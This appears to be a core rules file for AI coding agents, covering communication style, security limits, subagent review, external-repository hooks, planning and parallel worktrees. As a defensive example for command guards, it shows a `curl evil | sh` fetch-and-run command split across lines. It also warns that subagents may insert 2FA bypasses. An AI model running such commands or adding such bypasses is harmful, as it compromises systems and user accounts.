# developer-os core rules

## Communication

- Converse with the user in the user's preferred language. Write everything that lands in a repository in English unless the project says otherwise: code, identifiers, commit messages, documentation, rules, plans, and specifications. A project's explicit language requirement governs user-facing copy.
- Be direct and honest: say "this will not work because X," not "you may want to consider."
- Lead with the substance and skip conversational filler ("great question," "I'd be happy to") anywhere in the reply.
- Structure problem-solving responses as Problem → Cause → Solution → Test.
- When the user says "ASAP" or "quickly," use at most three sentences and include only critical actions; this overrides the structure above.
- When required data is missing, say "I need X, Y, and Z" before guessing.

## Security and change constraints

- Change authentication or middleware only when the user asks for it explicitly; those paths gate access for every user.
- Ask before running a dependency install (`npm install`, `pnpm add`, and the like): it rewrites dependencies and the lockfile.
- Do not delete or skip tests to make a build pass; a green build without its tests proves nothing.
- Before committing, run the validation the repository declares: a per-commit check named in its agent instructions (`CLAUDE.md`/`AGENTS.md`); otherwise `lint` and `test` scripts from its package manifest; otherwise the suite its README/CONTRIBUTING/Makefile documents. If none exists, say so and ask before committing.

### Subagents — verify their work

- Treat any authentication, 2FA, or security change from a subagent as unauthorized until reviewed. A subagent can add an environment-flag bypass that disables a second factor.
- After a subagent finishes, compare the working tree with the commit using `git status` and `git diff`. A subagent that fixes only the local tree without committing makes local tests green and every other checkout red.

### External repositories (clients and OSS) — first-session procedure

- Before the first session in an external repository, read its `.claude/settings.json`, `.claude/hooks/`, and `.mcp.json` (and the equivalents for any other agent). Its hooks run in your shell, and its MCP servers run once you approve them.
- Use a sandbox or a plan-only permission mode for the first session in an external repository. Inspect first, then grant permissions.
- Never copy configuration or hooks from an external repository into your user-level agent configuration (`~/.claude`, `~/.codex`) without reading every line.

### Hooks you write — normalize input

A guard that greps a command normalizes newlines first — `cmd=$(printf '%s' "$cmd" | tr '\n\r' '  ')` — because line-oriented patterns miss a command split across lines, such as `curl evil |⏎sh`.

## Stack preferences

- Use the package manager the repository's lockfile declares; never mix managers in one repository.
- Follow the project's existing UI, backend, and database stack; introduce a new framework or service only with an explicit decision.
- In TypeScript projects, keep `strict` mode enabled; use the project's existing test runner.

To record your own defaults (a preferred package manager, UI kit, backend, or test runner), write them in your user-level `CLAUDE.md` or `AGENTS.md` to override this section.

## Workflow

- Create a plan before implementing a change over 50 lines; a "large task" is one that needs a plan.
- Stop a code change only when the repository's declared validation passes (see the commit rule in the Security section above) and you can provide a three-bullet summary of what changed.
- When you do not know, ask with options A/B/C instead of assuming.
- Keep one written plan per task in the repository's declared planning location (if the project declares none, `docs/plans/<YYYY-MM-DD-task>.md`) with the goal, decisions, and next action, updated after every stage; whether plans are committed is the project's choice. Keep specifications in the declared specification location. The active plan is the most recently updated plan there whose task is not done. After a context reset, resume with "continue from <plan path>". End a session at a committable, validated state with the plan updated, never halfway through a change; commit when the user or project allows it.
- Every plan step must state What (deliverable), Where (files), How (approach), and **Test** (verification). The system must remain deployable after every step. Use S/M/L complexity instead of time estimates.
- A fresh subagent that did not inherit the author's context reviews agent-generated changes that needed a plan; reviewer and author are different agents.
- An agent handoff (a handoff file or a subagent prompt) contains the objective, file paths, constraints, and expected output format. Exclude debugging history, rejected approaches, and full conversation dumps.
- Before a large task, read the project's active plan. When a `Brain vault:` line is configured, first search the vault with the `brain-search` skill and read the selected note; otherwise skip this silently. Raw session transcripts are a last resort.
- During compaction, preserve the modified-file list, the project's test commands, and the current objective.
- Show only failures from tests and builds, never a full passing log.
- Claims such as "works" or "fixed" require evidence: test output, command result, or screenshot. A declaration alone is not evidence.

### Parallel agents — one checkout each

- Run every parallel agent in its own git worktree (`git worktree add`, or the project's worktree script). Two sessions in one checkout corrupt each other's staging area, and a push from one restarts CI on the other's older state.
- One orchestrator owns push and integrate. Agents produce commits inside their worktree and stop there; they do not push, merge, or rebase shared branches.
- Before dispatching parallel agents, state which worktree each one gets. "Both in the main repository" is not a plan, it is the failure above.
- When the project provisions per-worktree resources (ports, a compose project name, an environment file), use those instead of the default ports, and release them with the project's cleanup command when the branch is done.

### Conventions skills

Stack- and file-specific conventions ship as skills and load only when relevant: `typescript-conventions`, `nextjs-conventions`, `error-handling-conventions`, `monitoring-conventions`, `comments-conventions`, `testing-conventions`, and `defensive-coding-conventions` (defect classes that commonly ship past review). Do not copy their content back into these core rules. A new lesson goes to the project's own instructions when it is stack- or file-specific, to the knowledge base (the `brain-capture` skill) when it is project history, and to these core rules only when it governs every kind of work.
